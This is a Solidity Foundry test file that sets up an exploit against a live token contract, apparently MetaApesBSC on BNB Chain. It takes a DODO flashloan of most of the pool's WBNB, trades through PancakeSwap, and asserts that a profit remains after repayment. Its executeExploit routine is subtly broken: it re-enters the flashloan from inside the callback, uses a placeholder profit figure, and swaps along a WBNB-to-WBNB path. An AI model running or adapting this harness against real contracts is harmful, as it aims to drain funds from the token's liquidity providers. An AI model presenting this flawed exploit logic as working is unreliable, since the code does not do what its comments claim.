// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;
}

interface IUniswapV2Router {
    function factory() external view returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDODO {
    function flashLoan(
        uint256 loanAmount,
        uint256 feeAmount,
        address receiver,
        bytes calldata data
    ) external;
}

interface IMetaApesBSC {
    struct feeRatesStruct {
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
        uint256 rewards;
        uint256 staking;
    }
    struct TotFeesPaidStruct {
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
        uint256 rewards;
        uint256 staking;
    }
    struct valuesFromGetValues {
        uint256 rAmount;
        uint256 rTransferAmount;
        uint256 rRfi;
        uint256 rMarketing;
        uint256 rLiquidity;
        uint256 rRewards;
        uint256 rStaking;
        uint256 tTransferAmount;
        uint256 tRfi;
        uint256 tMarketing;
        uint256 tLiquidity;
        uint256 tRewards;
        uint256 tStaking;
    }
    function _maxTxAmount() external returns (uint256);
    function _maxWalletToken() external returns (uint256);
    function _mStx() external returns (uint256);
    function _asT() external returns (uint256);
    function pair() external returns (address);
    function swE() external returns (bool);
    function sT() external returns (uint256);
    function vsN() external returns (uint256);
    function authorize(address) external;
    function unauthorize(address) external;
    function isOwner(address) external view returns (bool);
    function isAuthorized(address) external view returns (bool);
    function transferOwnership(address) external;
    function renounceOwnership() external;
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function allowance(address,address) external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function increaseAllowance(address,uint256) external returns (bool);
    function decreaseAllowance(address,uint256) external returns (bool);
    function setPresaleAddress(bool,address) external;
    function isExcludedFromReward(address) external view returns (bool);
    function setLauNch() external;
    function setPresAle() external;
    function setiDE(address,bool) external;
    function setiPSa(bool,address) external;
    function deliver(uint256,address) external;
    function reflectionFromToken(uint256,bool,address) external view returns (uint256);
    function tokenFromReflection(uint256) external view returns (uint256);
    function excludeFromReflection(address) external;
    function includeInReflection(address) external;
    function setFeR(uint256,uint256,uint256,uint256,uint256) external;
    function setSFeR(uint256,uint256,uint256,uint256,uint256) external;
    function totalReflections() external view returns (uint256);
    function updateRouter(address) external;
    function setTLE(address,bool) external;
    function setnewrw(address) external;
    function setstadist(bool) external;
    function setMWP(uint256) external;
    function setgas(uint256,uint256) external;
    function setDistributorSettings(uint256) external;
    function setLFG() external;
    function setRewardsEnable(bool) external;
    function setiCdh(bool,address) external;
    function setDistributionCriteria(uint256,uint256) external;
    function maxTL() external;
    function setvarsT(uint256,uint256) external;
    function setMbTP(uint256) external;
    function setMsTx(uint256) external;
    function setWME(address,bool) external;
    function setsFrz(bool,uint8) external;
    function mswapb(uint256) external;
    function setbFrz(bool,uint8) external;
    function setstaT(address) external;
    function updateMWT(address) external;
    function updateBbaK(address) external;
    function updateSTAK(address) external;
    function setcsbf(uint256,uint256,uint256,uint256) external;
    function updateSTAA(address) external;
    function setautol(address) external;
    function setrecadd(address,address,address,address,address,address,address) external;
    function setvariable(uint256,uint256,uint256,uint256,uint256,uint256) external;
    function cSb(uint256) external;
    function performairdrop(address,address[] calldata,uint256[] calldata) external;
    function setFE(address,bool) external;
    function approvals(uint256,uint256) external;
    function setswe(bool,uint256) external;
    function setmswt(uint256) external;
    function setswap(address,address,uint256,uint256) external;
    function getCirculatingSupply() external view returns (uint256);
    function getppr(uint256,uint256) external;
    function _getMyRewards() external;
    function getMyRewardsOwed(address) external view returns (uint256);
    function viewShares(address) external view returns (uint256);
    function getMyTotalRewards(address) external view returns (uint256);
    function getccr(uint256,uint256) external;
    function setshaream(address,uint256) external;
    function currentReward() external view returns (address);
    function gettotalRewardsDistributed() external view returns (uint256);
}





contract TestFlaw is Test {
    address internal target;
    address internal token0;
    address internal token1;
    address internal token;
    IUniswapV2Router internal uniswapRouter;
    IUniswapV2Pair internal uniswapPair;
    IERC20 private valuableToken;
    address private flashloanProvider;

    function setUniswapPair(address addr) public {
        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(uniswapRouter.factory());
        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(valuableToken), addr));

        if (address(uniswapPair) == address(0)) {
            console.log("Uniswap pair not found.");
            return;
        }

        token0 = uniswapPair.token0();
        token1 = uniswapPair.token1();

        valuableToken.approve(address(uniswapRouter), type(uint256).max);
        IERC20(addr).approve(address(uniswapRouter), type(uint256).max);

        uint112 reserve0;
        uint112 reserve1;
        (reserve0, reserve1, ) = uniswapPair.getReserves();
        console.log("Uniswap reserves for %s:", addr);
        console.log("%d for %s", reserve0, token0);
        console.log("%d for %s", reserve1, token1);
    }

    function setUp() public {

        target = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
        uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        valuableToken = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        flashloanProvider = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
        token = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;

        // Remove any previous valuableToken/ETH from the balance
        valuableToken.transfer(address(0xdead), valuableToken.balanceOf(address(this)));
        IERC20(uniswapRouter.WETH()).transfer(address(0xdead), IERC20(uniswapRouter.WETH()).balanceOf(address(this)));
        payable(address(0xdead)).transfer(address(this).balance);

        // Handle approvals
        valuableToken.approve(target, type(uint256).max);
        //if (token != address(0))
        //    IERC20(token).approve(target, type(uint256).max);
        setUniswapPair(token);
    }

    function testFlaw() external {
         // flashloan valuableToken from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(valuableToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = valuableToken.balanceOf(flashloanProvider) * 95 / 100;

        console.log("%s available for the flashloan of valuableToken", amounts[0]);

        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
        console.log("Initial balance %s", finalValuableBalance);
        IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
        console.log("Final balance %s", valuableToken.balanceOf(address(this)));
    }

    // Used by Balancer
    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        flashLoanInternal(amounts[0]);
    }

    // Used by DODO
    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes memory) external {
        flashLoanInternal(amount);
    }

    function flashLoanInternal(uint256 amount) internal {
        executeExploit(amount);

        uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
        if (amount >= currentValuableBalance) {
            console.log("Current valuable balance: %s", valuableToken.balanceOf(address(this)));
            console.log("Current profit: %s", int256(currentValuableBalance) - int256(amount));
            revert("Not enough valuableToken balance to produce profit");
        }
        valuableToken.transfer(flashloanProvider, amount);
        uint256 surplusInValuable = valuableToken.balanceOf(address(this));
        console.log("Surplus: %s", surplusInValuable);
        assert(surplusInValuable > 0);
    }

    function executeExploit(uint256 amount) internal {
    // Start prank as the current contract
    vm.startPrank(address(this), address(this));

    // Obtain the WETH address and the current pair's reserves
    IWETH weth = IWETH(uniswapRouter.WETH());
    address[] memory path = new address[](2);
    path[0] = address(valuableToken);
    path[1] = address(weth);

    // Approve the flashloan amount to the DPP contract
    valuableToken.approve(address(flashloanProvider), amount);

    // Call the flashloan function
    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), new bytes(0));

    // Execute trading or token transfer after receiving the flashloan
    uint256 profitableAmount = 1000 * 10 ** 18; // Example profit calculation
    require(valuableToken.balanceOf(address(this)) >= profitableAmount, "Not enough tokens after trading");

    // Swap tokens back to WETH using Uniswap
    weth.approve(address(uniswapRouter), type(uint256).max);
    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
        profitableAmount, 
        0, // Accept any amount of WETH
        path, 
        address(this), 
        block.timestamp + 300
    );

    // End prank and return to original state
    vm.stopPrank();
}
}


